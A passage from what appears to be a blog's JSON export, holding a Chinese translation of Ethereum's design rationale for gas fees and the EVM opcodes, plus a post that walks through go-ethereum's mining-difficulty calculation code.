B 会看到 <code>B.M[0] = 0</code> 和 <code>B.S[0] = 17</code>。这种区别的目的是（1）为每个执行实例提供自己的内存，这些内存不会受到递归调用的破坏，使安全编程变得更加容易，并且（2）提供一种可以非常快地操作的内存形式， 因为需要修改树，所以存储更新的速度一定很慢。</li>\n<li><strong>栈/内存模型</strong> - 早期做出的决定有三种计算状态（除了指向下一条指令的程序计数器外）：栈（一种标准的先进后出的 32 字节变量栈），内存（一种无限可扩展的临时字节数组）和存储（永久存储）。在临时存储方面，堆栈和内存的替代方案是一个仅限内存的范例，或者是寄存器和内存的混合（不是很不相同，因为从根本上说寄存器也是一种内存）。在这个例子中，每个命令会有三个参数，如 <code>ADD R1 R2 R3:M[R1] = M[R2] + M[R3]</code>。选择堆栈范例的原因很明显，它使代码缩小了四倍。</li>\n<li><strong>32 字节字大小</strong> - 与其他大多数架构一样，替代方案是 4 或 8 个字节的字，或者像比特币一样是无限的字。4 字节或 8 字节字太严格，无法存储加密计算的地址和很大的值，而无限的值则很难根据其建立一个安全的燃料模型。32 字节是理想的，因为它足够大以存储许多加密实现中常见的 32 字节值，以及地址（并提供将地址和值打包到单个存储索引中的优化能力），但又不会太大以至于效率变得极低。</li>\n<li><strong>拥有我们自己的虚拟机</strong> - 替代方案是使用 <code>Java</code>，或者一些 <code>Lisp dialect</code>，或者 <code>Lua</code>。我们认为拥有一个专门的虚拟机是合适的，因为（i）我们的虚拟机规格比许多其他虚拟机简单得多，因为其他虚拟机必须为复杂性付出更低的成本，而在我们的情况下，每次增加复杂性都是朝着创建开发集中化和可能存在包括共识失败的安全漏洞这样的高门槛迈出的一步（whereas in our case every additional unit of complexity is a step toward high barriers of entry creating development centralization and potential for security flaws including consensus failures,），（ii）它使我们能够更专业化虚拟机，例如，通过具有 32 字节的字大小，（iii）它使我们不会有非常复杂的可能导致安装困难的外部依赖性，以及（iv）针对以太坊的特殊安全需求的安全审查，无论如何都需要对外部虚拟机进行安全审查，因此节省的工作量并不大。</li>\n<li><strong>使用可变的可扩展内存大小</strong> - 我们认为，如果规模很小，或者规模很大，都没有必要限定一个固定的内存大小，并且注意如果内存访问的语句在任何情况下都需要检查越界访问，那么固定大小就不会使执行效率更高。</li>\n<li><strong>不限制堆栈大小</strong> - 没有任何特别的理由; 请注意，在许多情况下，限制并非绝对必要，因为燃料消耗和区块级燃料限制的组合总是作为每种资源消耗的上限。</li>\n<li><strong>有一个 1024 层级深度的调用限制</strong> - 许多编程语言在很高的堆栈深度时会比在很高的内存使用率或计算负载时突然崩溃的速度快得多，因此区块燃料限制的隐含限制可能不足。</li>\n<li><strong>没有类型</strong> - 为了简单。相反，取而代之的是使用有符号或无符号的操作码如 <code>DIV, SDIV, MOD, SMOD</code>（事实证明，对于 <code>ADD</code> 和 <code>MUL</code>，有符号和无符号操作码的行为是等同的），以及定点数运算（高深度定点运算是 32 字节字的另一个好处）在任何情况下都很简单，如 32 位深度，<code>a * b -&gt; (a * b) / 2^32</code>，<code>a / b -&gt; a * 2^32 / b</code> 以及 +，- 和 * 在整数情况下保持不变。</li>\n</ul>\n<p>虚拟机中的一些方法和操作码的目的是显而易见的，但也不全是。一些特殊解释给出如下：</p>\n<ul>\n<li><strong><code>ADDMOD, MULMOD</code></strong>：在大多数情况下，<code>addmod(a, b, c) = a * b % c</code>。然而，在许多类椭圆曲线密码学的特定情况下，使用 32 字节模块化算术，因此直接做 <code>a * b % c</code> 实际上是 <code>((a * b) % 2 ^ 256) % c</code>，这就是一个完全不同的结果。在 32 字节的空间中使用 32 字节的值计算 <code>a * b % c</code> 的公式是十分普通和臃肿的。</li>\n<li><strong>SIGNEXTEND</strong>：SIGNEXTEND 的目的是促进从更大的有符号整数到更小的有符号整数的类型转换。 小的带符号整数很有用，因为 JIT 编译的虚拟机将来可以检测长时间运行的代码块，这些代码块主要处理 32 字节整数，并大大加快速度。</li>\n<li><strong>SHA3</strong>： SHA3 在以太坊代码中十分使用，因为使用存储的安全无限大小散列映射可能需要使用安全散列函数，以防止恶意冲突，以及验证默克尔树，甚至是验证类以太坊的数据结构。一个关键点是它的朋友 SHA256，ECRECOVER 和 RIPEMD160不是作为操作码而是伪协议被包含其中。这样做的目的是将它们放入一个单独的类别中，以便在之后我们提出适当的“本机扩展”系统时，可以添加更多此类合约而不是填充操作码的空间。</li>\n<li><strong>ORIGIN</strong>：提供交易发送人的 <code>ORIGIN</code> 操作码的主要用途是允许合约对燃料进行退款支付。</li>\n<li><strong>COINBASE</strong>：<code>COINBASE</code> 操作码的主要用途是（i）允许子货币选择为网络安全做出贡献;以及（ii）开放矿工的使用权，作为分布式经济集合，用于基于次级共识的应用程序，如 Schellingcoin。</li>\n<li><strong>PREVHASH</strong>：用作半安全随机源，并允许合约评估前一个区块中 Merkle 树状态的树状证明，而不需要高度复杂的递归“以太坊中的以太坊轻客户端”构造。</li>\n<li><strong>EXTCODESIZE, EXTCODECOPY</strong>：这里的主要用途是允许合约在与其他合约进行交互之前，根据模板检查其他合约的代码，甚至模拟它们。见应用的<a href=\"http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/\" target=\"_blank\" rel=\"noopener\">http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/</a></li>\n<li><strong>JUMPDEST</strong>：JIT 编译的虚拟机在跳转目标受限于几个索引时变得更容易实现（具体的说，可变目标跳转的计算复杂度大致为 O(log(有效跳转目标的数量))，尽管静态跳转总是常量时间）。因此，我们需要（i）对有效变量跳转目标的限制，（ii）激励使用静态跳转。为了达到这些目的，我们有以下规则（i）在被推送紧接着的跳转可以跳转到任意地方，但是不能跳转到另一个跳转，（ii）其他跳转尽能跳到 JUMPDEST。限制跳转到跳转是必要的，这样查看一个跳转是动态还是静态的可以很容易的根据代码中在它之前的操作判断。对静态跳转缺乏 JUMPDEST 操作的需求是使用它们的动机。禁止跳入推送数据也会加速 JIT VM 的编译和执行。</li>\n<li><strong>LOG</strong>：LOG 表示记录事件，可见上面树的使用部分。</li>\n<li><strong>CALLCODE</strong>：这个操作符的目的是允许合约以存储在其他合约中的代码的形式调用“函数”，这样具有单独的堆栈和内存，但是使用该合约自己的存储。这使得在区块链上可扩展地实现代码的“标准库”变得更加容易。</li>\n<li><strong>SELFDESTRUCT</strong>：如果不再需要一个合约可以通过此操作符来销毁该合约。SELFDESTRUCT 在交易执行结束时被处理，而不是立即处理，这是因为拥有回滚早已执行的 SELFDESTRUCT 的能力会大大增加一个高效的虚拟机实现中所需的高速缓存的复杂度。</li>\n<li><strong>PC</strong>：尽管在理论上不是必需的，因为 PC 操作码的所有实例都可以通过简单地将实际的程序计数器放在该索引处作为推动来替换，使用代码中的 PC 允许创建与位置无关的代码（即编译的可复制/粘贴到其他合同中的函数，并且如果它们以不同的索引结束就不会中断）。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://xingyunbite.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%89/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译三</a></p>\n<h2 id=\"燃料和手续费\"><a href=\"#燃料和手续费\" class=\"headerlink\" title=\"燃料和手续费\"></a>燃料和手续费</h2><p>比特币中的交易大致相同，因此它们在网络上的成本可以抽象成一个模型，而以太坊中的交易则更复杂，交易费用系统需要考虑许多因素，包括带宽成本 ，存储成本和计算成本。特别重要的是，以太坊编程语言是图灵完备的，因此交易可以使用任意数量的带宽，存储和计算，并且因为不能提前可靠地预估暂停的问题，算力可能被大量使用。所以防止通过无限循环进行的拒绝服务攻击是一个关键目标。</p>\n<p>交易手续费的基本机制如下：</p>\n<ul>\n<li>每笔交易都需要指定一定数量愿意被花费的燃料（被称作 <code>startgas</code>），以及愿意为每单位燃料支付的价格（<code>gasprice</code>）。在执行之初，<code>startgas * gasprice</code> 这么多的 <code>ether</code> 会从交易发送者的账户中被扣除。</li>\n<li>交易执行期间的所有操作，包括数据库的读写，消息，和虚拟机中的每个计算步骤，都会消耗一定数量的燃料。</li>\n<li>如果一笔交易执行被完整地处理，消耗的燃料比它限定的燃料少，那么该剩余的燃料被称作 <code>gas_rem</code>。一笔交易首先会正常执行，然后在交易执行的最后，交易发送者会收到一笔退款 <code>gas_rem * gasprice</code>，矿工会收到一笔 <code>(startgas - gas_rem) * gasprice</code> 的奖励。</li>\n<li>如果在交易执行过程中，燃料耗尽，那么所有的执行都会被回滚，而交易也依旧未被验证。该交易的唯一影响是 <code>startgas * gasprice</code> 会被转给矿工。</li>\n<li>当一个合约发送一个消息给另一个合约，它也可以设置一个燃料限定值来指定由该消息引起的子执行操作。如果该执行耗尽燃料，那么一切回滚，而燃料也会被消耗。</li>\n</ul>\n<p>以上的每个部分都是必要的。例如：</p>\n<ul>\n<li>如果交易不需要指定燃料限制，那么恶意用户可以发送一笔进行数十亿循环的交易，因为处理这样的交易将花费比块间隔更长的时间，所以没有人能够处理它， 但矿工们无法预知该交易的存在，那么就会导致拒绝服务漏洞。</li>\n<li>将时间限制替代燃料限制，并不会起作用，因为这太主观了（有些机器比其他机器更快，甚至在相同的机器中也总是存在闭合调用）。</li>\n<li>整个值 <code>startgas * gasprice</code> 必须在开始时即作为押金取出，这样就不会出现账户在执行中“破产”并且无法支付燃料的情况。 请注意，余额检查是不够的，因为帐户可以在其他地方发送余额。</li>\n<li>如果在燃料不足的错误下，执行没有回滚，那么合约就需要采取强有力但是困难的安全措施，以防止自身被交易或消息利用而提供只能运行到一半的燃料，从而导致当前正在执行的合约发生一些变化。</li>\n<li>如果子限制不存在，那么敌对账户可以通过与其签订协议来制定对其他合同的拒绝服务攻击，然后在计算开始时插入无限循环，这样受害者合约中的任何企图补偿攻击合约（any attempts by the victim contract to compensate the attack contract）或向其发送消息的行为都会使整个交易执行陷于瘫痪。</li>\n<li>要求交易发送者支付燃料而不是合约来支付，大大提高了开发者的可用性。以太坊的早期版本有支付燃料的合约，但是这导致了一个相当丑的问题，即每个合约都必须实施“守卫”代码，以确保每一个传入的消息都足以补偿合约以足以支付燃料的消耗。</li>\n</ul>\n<p>注意燃料消耗的特定的特性：</p>\n<ul>\n<li>21000 单位的燃料是一笔交易的基本手续费。这涵盖了从签名中恢复发件人地址以及存储交易的空间和带宽空间的椭圆曲线操作的成本。</li>\n<li>一笔交易可以包括无限的数据，虚拟机提供了操作码使得合约接受交易来访问数据。固定燃料手续费为，每个 0 字节 4 单位燃料，每个非 0 字节 68 单位燃料。这个公式是因为我们注意到用户写的合约中的大多数交易数据都被组织成一系列 32 字节的参数，其中大部分都有前导 0 字节，虽然这样的构造看起来似乎没有效率，但是由于压缩算法的存在，这样反而十分有效率，我们希望鼓励使用它们来代替更复杂的机制，以便根据预期的字节数来压缩参数，从而在编译器级别增加复杂性。这是三明治复杂性模型的一个例外，但是由于成本与收益的比例，这是合理的。</li>\n<li><code>SSTORE</code> 操作符会在账户的存储空间中设置变量，它的消耗如下：(i) 将一个为零的变量改为非零时，为 20000 单位的燃料，(ii) 将一个零变量改为零变量，将一个非零变量改为非零变量时，为 5000 单位燃料，(iii) 将非零变量改为零变量时，为 5000 单位燃料，加上在成功交易执行结束时提供的 20000 单位燃料退款。（plus a 20000 gas refund to be given at the end of successful transaction execution）（即不是执行导致的燃料耗尽异常）。退款最高为交易花费的全部燃料的一半。这提供了一个小小的激励来清空存储空间，因为我们注意到，没有这样的激励的话，很多合约都会留下一些未使用的存储空间，导致快速膨胀增加体积，为存储“收取租金”提供了很多好处，同时也没有风险，一个被放置好的合同将永远存在。延迟退款机制对于防止拒绝服务攻击是必要的，攻击者会发送具有少量燃料的交易，在一个运行很长时间的循环中频繁清空大量的存储空间，这样会很快耗尽燃料，也会消耗验证者大量的算力，但这个操作实际上却并没有清空存储空间或者花费大量的燃料。50% 的上限是为了确保一个矿工在获得具有一定数量燃料的交易后仍然可以确定执行交易的计算时间的上限。</li>\n<li>合约提供的消息中的数据不会消耗燃料。这是因为在消息调用期间不需要真正“复制”任何数据，因为调用数据可以简单地看作是指向父合约的内存的指针，它在子进程执行期间不会改变。</li>\n<li>内存是一个无限可扩展的阵列。 但是，每 32 字节的内存扩展会消耗一个单位的燃料，这里会四舍五入。</li>\n<li>一些计算时间高度依赖于参数的操作码，拥有不同的燃料消耗值。比如，指数的燃料消耗为 10 加上指数中的每字节的 10 单位（即 x^0 = 1 燃料，x^1…x^255 = 2 燃料，x^256…x^65535 = 3 燃料 等等），而复制操作码（<code>CALLDATACOPY, CODECOPY, EXTCODECOPY</code>）的燃料消耗为 1 加上每 32 字节的一单位燃料，这里四舍五入（<code>LOG</code> 拥有类似的规则）。内存膨胀的燃料成本不足以弥补这一缺陷，因为它打开了一次二次攻击（50000 轮的 50000 单位燃料的 <code>CALLDATACOPY</code> 约为 50000 ^ 2 的计算量，但在引入可变燃料成本之前只有约 50000 单位燃料）</li>\n<li>如果值非零，那么<code>CALL</code> 操作码（和对称的 <code>CALLCODE</code>）花费额外的 9000 单位燃料。这是因为任意值转移都会导致存档节点的历史存储空间严重膨胀。注意，实际的手续费为 6700；在这之上我们强制增加了一个最低为 2300 单位的燃料用来自动给收据。这是为了确保收到交易的钱包至少有足额的燃料来记录该交易。</li>\n</ul>\n<p>燃料机制的另一个重要的部分是燃料价格本身的经济性。比特币中使用的默认方法是完全自愿的手续费，依靠矿工设置动态的最低值来扮演一个守门人的角色；与之相对的，在以太坊中，允许交易发送者设置任意的燃料消耗。这种方式在比特币社区中十分受欢迎，因为它是基于市场的，允许矿工和交易发送者之间的供需关系决定价格。然而这里存在一个问题，交易处理并不是市场；尽管将交易处理作为矿工提供给发送方的服务具有直接的吸引力，但实际上，矿工打包的每笔交易都需要被网络上的每个节点处理，因此绝大多数交易处理成本由第三方承担，而不是决定是否打包该交易的矿工。因此，很可能会发生普遍灾难（tragedy-of-the-commons）的问题。</p>\n<p>目前，由于缺少关于矿工实际上是如何处理的详细信息，我们实施了一个相当简单的方法：一个投票系统。矿工拥有权力对当前的区块设置燃料限制，该限制与上一个区块的燃料限制可以有大约 0.0975%（1/1024）的浮动，因此产生的燃料限制应该为矿工偏好的中位数。我们希望将来能够将其分解为更精确的算法。</p>\n<h2 id=\"虚拟机\"><a href=\"#虚拟机\" class=\"headerlink\" title=\"虚拟机\"></a>虚拟机</h2><p>以太坊虚拟机是交易码执行的引擎，也是以太坊和其他系统不同的核心特性。注意，将 <em>虚拟机</em> 和 <em>合约</em> 与 <em>消息模型</em> 分别看待，比如， <code>SIGNEXTEND</code> 操作码是虚拟机的一个特性，而合约可以调用其他合约，指定子调用的燃料限制是合约和消息的一部分。以太坊虚拟机的设计目的包括：</p>\n<ul>\n<li><strong>简单</strong>：尽可能少的底层操作码，尽可能少的数据类型，以及尽可能少的虚拟机层次的结构。</li>\n<li><strong>完全明确</strong>：在虚拟机的说明中绝对不允许存在模棱两可的情况，并且结果必须是完全确定的。另外，应该有一个精确的计算步骤的概念，可以测量计算燃料的消耗。</li>\n<li><strong>节省空间</strong>：以太坊虚拟机组件应尽可能紧凑（例如，默认 C 程序的 4000 字节基本大小是不可接受的）。</li>\n<li><strong>期望的应用的专业能力（Specialization to expected applications）</strong>：有能力处理 20 字节地址 和自定义的32 字节变量的加密，自定义加密中的模块化算法，读取区块和交易数据，与状态交互等等。</li>\n<li><strong>简单的安全</strong>：应该很容易就能够想出操作符的燃料消耗模型，该模型使得虚拟机无法被利用。</li>\n<li><strong>优化友好</strong>：应该很容易优化，以便可以构建 <code>JIT</code> 编译的和其他速度更快的 <code>VM</code> 版本。</li>\n</ul>\n<p>一些特殊的设计决定如下：</p>\n<ul>\n<li><strong>临时/永久存储的区别</strong> - 存在于虚拟机的每个实例内并在虚拟机执行完成时消失的临时存储与基于每个账户的存在于区块链状态级别上的永久存储之间存在区别。比如，假设执行下列执行树（使用 S 代表永久存储，M 代表临时存储）：（i） A 调用 B，（ii） B 设置 <code>B.S[0] = 5</code>，<code>B.M[0] = 9</code>，（iii） B 调用 C，（iv）C 调用 B。在此时，如果 B 树读取 <code>B.S[0]</code>，它会获取到之前存储在 B 中的值，但是 B 树读取 <code>B.M[0]</code>，它回返回 0，因为在虚拟机的临时存储中这个一个新的实例。如果 B 在这个内部调用中设置 <code>B.M[0] = 13</code> 和 <code>B.S[0] = 17</code>，然后这个内部调用和 C 的调用终止，使得执行回到 B 的外部调用，然后 B 读取 M，将会看到 <code>B.M[0] = 9</code>(自上次设置此值在同一个 VM 执行实例中) 和 <code>B.S[0] = 17</code>。如果 B 的外部调用终止，A 再次调用 B，然后 B 会看到 <code>B.M[0] = 0</code> 和 <code>B.S[0] = 17</code>。这种区别的目的是（1）为每个执行实例提供自己的内存，这些内存不会受到递归调用的破坏，使安全编程变得更加容易，并且（2）提供一种可以非常快地操作的内存形式， 因为需要修改树，所以存储更新的速度一定很慢。</li>\n<li><strong>栈/内存模型</strong> - 早期做出的决定有三种计算状态（除了指向下一条指令的程序计数器外）：栈（一种标准的先进后出的 32 字节变量栈），内存（一种无限可扩展的临时字节数组）和存储（永久存储）。在临时存储方面，堆栈和内存的替代方案是一个仅限内存的范例，或者是寄存器和内存的混合（不是很不相同，因为从根本上说寄存器也是一种内存）。在这个例子中，每个命令会有三个参数，如 <code>ADD R1 R2 R3:M[R1] = M[R2] + M[R3]</code>。选择堆栈范例的原因很明显，它使代码缩小了四倍。</li>\n<li><strong>32 字节字大小</strong> - 与其他大多数架构一样，替代方案是 4 或 8 个字节的字，或者像比特币一样是无限的字。4 字节或 8 字节字太严格，无法存储加密计算的地址和很大的值，而无限的值则很难根据其建立一个安全的燃料模型。32 字节是理想的，因为它足够大以存储许多加密实现中常见的 32 字节值，以及地址（并提供将地址和值打包到单个存储索引中的优化能力），但又不会太大以至于效率变得极低。</li>\n<li><strong>拥有我们自己的虚拟机</strong> - 替代方案是使用 <code>Java</code>，或者一些 <code>Lisp dialect</code>，或者 <code>Lua</code>。我们认为拥有一个专门的虚拟机是合适的，因为（i）我们的虚拟机规格比许多其他虚拟机简单得多，因为其他虚拟机必须为复杂性付出更低的成本，而在我们的情况下，每次增加复杂性都是朝着创建开发集中化和可能存在包括共识失败的安全漏洞这样的高门槛迈出的一步（whereas in our case every additional unit of complexity is a step toward high barriers of entry creating development centralization and potential for security flaws including consensus failures,），（ii）它使我们能够更专业化虚拟机，例如，通过具有 32 字节的字大小，（iii）它使我们不会有非常复杂的可能导致安装困难的外部依赖性，以及（iv）针对以太坊的特殊安全需求的安全审查，无论如何都需要对外部虚拟机进行安全审查，因此节省的工作量并不大。</li>\n<li><strong>使用可变的可扩展内存大小</strong> - 我们认为，如果规模很小，或者规模很大，都没有必要限定一个固定的内存大小，并且注意如果内存访问的语句在任何情况下都需要检查越界访问，那么固定大小就不会使执行效率更高。</li>\n<li><strong>不限制堆栈大小</strong> - 没有任何特别的理由; 请注意，在许多情况下，限制并非绝对必要，因为燃料消耗和区块级燃料限制的组合总是作为每种资源消耗的上限。</li>\n<li><strong>有一个 1024 层级深度的调用限制</strong> - 许多编程语言在很高的堆栈深度时会比在很高的内存使用率或计算负载时突然崩溃的速度快得多，因此区块燃料限制的隐含限制可能不足。</li>\n<li><strong>没有类型</strong> - 为了简单。相反，取而代之的是使用有符号或无符号的操作码如 <code>DIV, SDIV, MOD, SMOD</code>（事实证明，对于 <code>ADD</code> 和 <code>MUL</code>，有符号和无符号操作码的行为是等同的），以及定点数运算（高深度定点运算是 32 字节字的另一个好处）在任何情况下都很简单，如 32 位深度，<code>a * b -&gt; (a * b) / 2^32</code>，<code>a / b -&gt; a * 2^32 / b</code> 以及 +，- 和 * 在整数情况下保持不变。</li>\n</ul>\n<p>虚拟机中的一些方法和操作码的目的是显而易见的，但也不全是。一些特殊解释给出如下：</p>\n<ul>\n<li><strong><code>ADDMOD, MULMOD</code></strong>：在大多数情况下，<code>addmod(a, b, c) = a * b % c</code>。然而，在许多类椭圆曲线密码学的特定情况下，使用 32 字节模块化算术，因此直接做 <code>a * b % c</code> 实际上是 <code>((a * b) % 2 ^ 256) % c</code>，这就是一个完全不同的结果。在 32 字节的空间中使用 32 字节的值计算 <code>a * b % c</code> 的公式是十分普通和臃肿的。</li>\n<li><strong>SIGNEXTEND</strong>：SIGNEXTEND 的目的是促进从更大的有符号整数到更小的有符号整数的类型转换。 小的带符号整数很有用，因为 JIT 编译的虚拟机将来可以检测长时间运行的代码块，这些代码块主要处理 32 字节整数，并大大加快速度。</li>\n<li><strong>SHA3</strong>： SHA3 在以太坊代码中十分使用，因为使用存储的安全无限大小散列映射可能需要使用安全散列函数，以防止恶意冲突，以及验证默克尔树，甚至是验证类以太坊的数据结构。一个关键点是它的朋友 SHA256，ECRECOVER 和 RIPEMD160不是作为操作码而是伪协议被包含其中。这样做的目的是将它们放入一个单独的类别中，以便在之后我们提出适当的“本机扩展”系统时，可以添加更多此类合约而不是填充操作码的空间。</li>\n<li><strong>ORIGIN</strong>：提供交易发送人的 <code>ORIGIN</code> 操作码的主要用途是允许合约对燃料进行退款支付。</li>\n<li><strong>COINBASE</strong>：<code>COINBASE</code> 操作码的主要用途是（i）允许子货币选择为网络安全做出贡献;以及（ii）开放矿工的使用权，作为分布式经济集合，用于基于次级共识的应用程序，如 Schellingcoin。</li>\n<li><strong>PREVHASH</strong>：用作半安全随机源，并允许合约评估前一个区块中 Merkle 树状态的树状证明，而不需要高度复杂的递归“以太坊中的以太坊轻客户端”构造。</li>\n<li><strong>EXTCODESIZE, EXTCODECOPY</strong>：这里的主要用途是允许合约在与其他合约进行交互之前，根据模板检查其他合约的代码，甚至模拟它们。见应用的<a href=\"http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/\" target=\"_blank\" rel=\"noopener\">http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/</a></li>\n<li><strong>JUMPDEST</strong>：JIT 编译的虚拟机在跳转目标受限于几个索引时变得更容易实现（具体的说，可变目标跳转的计算复杂度大致为 O(log(有效跳转目标的数量))，尽管静态跳转总是常量时间）。因此，我们需要（i）对有效变量跳转目标的限制，（ii）激励使用静态跳转。为了达到这些目的，我们有以下规则（i）在被推送紧接着的跳转可以跳转到任意地方，但是不能跳转到另一个跳转，（ii）其他跳转尽能跳到 JUMPDEST。限制跳转到跳转是必要的，这样查看一个跳转是动态还是静态的可以很容易的根据代码中在它之前的操作判断。对静态跳转缺乏 JUMPDEST 操作的需求是使用它们的动机。禁止跳入推送数据也会加速 JIT VM 的编译和执行。</li>\n<li><strong>LOG</strong>：LOG 表示记录事件，可见上面树的使用部分。</li>\n<li><strong>CALLCODE</strong>：这个操作符的目的是允许合约以存储在其他合约中的代码的形式调用“函数”，这样具有单独的堆栈和内存，但是使用该合约自己的存储。这使得在区块链上可扩展地实现代码的“标准库”变得更加容易。</li>\n<li><strong>SELFDESTRUCT</strong>：如果不再需要一个合约可以通过此操作符来销毁该合约。SELFDESTRUCT 在交易执行结束时被处理，而不是立即处理，这是因为拥有回滚早已执行的 SELFDESTRUCT 的能力会大大增加一个高效的虚拟机实现中所需的高速缓存的复杂度。</li>\n<li><strong>PC</strong>：尽管在理论上不是必需的，因为 PC 操作码的所有实例都可以通过简单地将实际的程序计数器放在该索引处作为推动来替换，使用代码中的 PC 允许创建与位置无关的代码（即编译的可复制/粘贴到其他合同中的函数，并且如果它们以不同的索引结束就不会中断）。</li>\n</ul>\n"},{"title":"以太坊挖矿之全网难度","comments":0,"date":"2018-03-16T09:44:57.000Z","img":null,"_content":"在[比特币挖矿之全网难度](http://c60block.com/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/)中，已经提到比特币系统可以根据之前的全网算力动态调整难度，在一定程度上应对难度暴涨或者暴跌的情况，难度调整的周期为两周，那么在以太坊系统中，挖矿难度是如何调整的呢？调整的周期又是多少呢？带着这两个问题，我查找了以太坊对应的源码(go版本实现)。\n以太坊中难度调整的代码在共识模块下的[CalcDifficulty](https://github.com/ethereum/go-ethereum/blob/d429a92f09e476c431830cef48690dc3784153c7/consensus/ethash/consensus.go#L297)代码中，具体实现如下：\n```\nfunc CalcDifficulty(config *params.ChainConfig, time uint64, parent *types.Header) *big.Int {\n    next := new(big.Int).Add(parent.Number, big1)\n    switch {\n    case config.IsByzantium(next):\n        return calcDifficultyByzantium(time, parent)\n    case config.IsHomestead(next):\n        return calcDifficultyHomestead(time, parent)\n    default:\n        return calcDifficultyFrontier(time, parent)\n    }\n}\n```\n我们看到以太坊的难度计算有三种情况，这里只讨论第二种情况，对应以太坊当前的发展阶段homestead。\n```\nfunc calcDifficultyHomestead(time uint64, parent *types.Header) *big.Int {\n    // algorithm:\n    // diff = (parent_diff +\n    //        (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n    //        ) + 2^(periodCount - 2)\n\n    bigTime := new(big.Int).SetUint64(time)\n    bigParentTime := new(big.Int).Set(parent.Time)\n\n    // holds intermediate values to make the algo easier to read & audit\n    x := new(big.Int)\n    y := new(big.Int)\n\n    // 1 - (block_timestamp - parent_timestamp) // 10\n    x.Sub(bigTime, bigParentTime)\n    x.Div(x, big10)\n    x.Sub(big1, x)\n\n    // max(1 - (block_timestamp - parent_timestamp) // 10, -99)\n    if x.Cmp(bigMinus99) < 0 {\n        x.Set(bigMinus99)\n    }\n\n    // (parent_diff + parent_diff // 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n    y.Div(parent.Difficulty, params.DifficultyBoundDivisor)\n    x.Mul(y, x)\n    x.Add(parent.Difficulty, x)\n\n    // minimum difficulty can ever be (before exponential factor)\n    if x.Cmp(params.MinimumDifficulty) < 0 {\n        x.Set(params.MinimumDifficulty)\n    }\n\n    // for the exponential factor\n    periodCount := new(big.Int).Add(parent.Number, big1)\n    periodCount.Div(periodCount, expDiffPeriod)\n\n    // the exponential factor, commonly referred to as \"the bomb\"\n    // diff = diff + 2^(periodCount - 2)\n    if periodCount.Cmp(big1) > 0 {\n        y.Sub(periodCount, big2)\n        y.Exp(big2, y, nil)\n        x.Add(x, y)\n    }\n    return x \n}\n```\n从上面的代码中可以提炼出以太坊的难度计算公式为：\n```\ndiff = (parent_diff +\n       (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n       ) + 2^(block_number/100000 - 2)\n```\n也可以按照下面的公式理解：\n本区块的难度 = 父区块难度 + 难度调整值 + 难度炸弹\n难度调整值 = f(父区块难度，父区块产生时间，本区块产生时间）\n难度炸弹 = 2^（区块号/100000 -2）\n因此以太坊中挖矿难度与上一个区块难度直接相关，难度调整周期为一个区块。\n","source":"_posts/以太坊挖矿之全网难度.md","raw":"---\ntitle: 以太坊挖矿之全网难度\ncomments: false\ndate: 2018-03-16 17:44:57\ncategories: 矿池\ntags:\n- LeonBCK\n- 以太坊\n- 全网难度\nimg:\n---\n在[比特币挖矿之全网难度](http://c60block.com/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/)中，已经提到比特币系统可以根据之前的全网算力动态调整难度，在一定程度上应对难度暴涨或者暴跌的情况，难度调整的周期为两周，那么在以太坊系统中，挖矿难度是如何调整的呢？调整的周期又是多少呢？带着这两个问题，我查找了以太坊对应的源码(go版本实现)。\n以太坊中难度调整的代码在共识模块下的[CalcDifficulty](https://github.com/ethereum/go-ethereum/blob/d429a92f09e476c431830cef48690dc3784153c7/consensus/ethash/consensus.go#L297)代码中，具体实现如下：\n```\nfunc CalcDifficulty(config *params.ChainConfig, time uint64, parent *types.Header) *big.Int {\n    next := new(big.Int).Add(parent.Number, big1)\n    switch {\n    case config.IsByzantium(next):\n        return calcDifficultyByzantium(time, parent)\n    case config.IsHomestead(next):\n        return calcDifficultyHomestead(time, parent)\n    default:\n        return calcDifficultyFrontier(time, parent)\n    }\n}\n```\n我们看到以太坊的难度计算有三种情况，这里只讨论第二种情况，对应以太坊当前的发展阶段homestead。\n```\nfunc calcDifficultyHomestead(time uint64, parent *types.Header) *big.Int {\n    // algorithm:\n    // diff = (parent_diff +\n    //        (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n    //        ) + 2^(periodCount - 2)\n\n    bigTime := new(big.Int).SetUint64(time)\n    bigParentTime := new(big.Int).Set(parent.Time)\n\n    // holds intermediate values to make the algo easier to read & audit\n    x := new(big.Int)\n    y := new(big.Int)\n\n    // 1 - (block_timestamp - parent_timestamp) // 10\n    x.Sub(bigTime, bigParentTime)\n    x.Div(x, big10)\n    x.Sub(big1, x)\n\n    // max(1 - (block_timestamp - parent_timestamp) // 10, -99)\n    if x.Cmp(bigMinus99) < 0 {\n        x.Set(bigMinus99)\n    }\n\n    // (parent_diff + parent_diff // 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n    y.Div(parent.Difficulty, params.DifficultyBoundDivisor)\n    x.Mul(y, x)\n    x.Add(parent.Difficulty, x)\n\n    // minimum difficulty can ever be (before exponential factor)\n    if x.Cmp(params.MinimumDifficulty) < 0 {\n        x.Set(params.MinimumDifficulty)\n    }\n\n    // for the exponential factor\n    periodCount := new(big.Int).Add(parent.Number, big1)\n    periodCount.Div(periodCount, expDiffPeriod)\n\n    // the exponential factor, commonly referred to as \"the bomb\"\n    // diff = diff + 2^(periodCount - 2)\n    if periodCount.Cmp(big1) > 0 {\n        y.Sub(periodCount, big2)\n        y.Exp(big2, y, nil)\n        x.Add(x, y)\n    }\n    return x 